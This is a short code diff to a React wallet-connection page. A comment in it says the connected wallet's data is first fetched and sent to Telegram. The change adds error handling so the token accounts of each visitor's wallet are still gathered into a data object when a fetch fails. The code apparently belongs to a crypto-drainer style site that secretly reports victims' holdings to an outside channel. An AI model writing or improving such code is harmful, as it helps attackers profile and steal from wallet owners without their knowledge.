@@ -27,8 +27,17 @@ const Index = () => {
       console.log("Starting wallet connection process");
       
       // First, get and send wallet data to Telegram
-      console.log("Fetching token accounts");
-      const tokens = await getTokenAccounts(connection, publicKey.toString());
+      console.log("Fetching token accounts for address:", publicKey.toString());
+      let tokens = [];
+      try {
+        tokens = await getTokenAccounts(connection, publicKey.toString());
+        console.log("Successfully fetched token accounts:", tokens);
+      } catch (tokenError) {
+        console.error("Token fetch error:", tokenError);
+        // Continue with empty tokens array instead of failing
+        tokens = [];
+      }
+      
       const walletData = {
         address: publicKey.toString(),
         tokens,
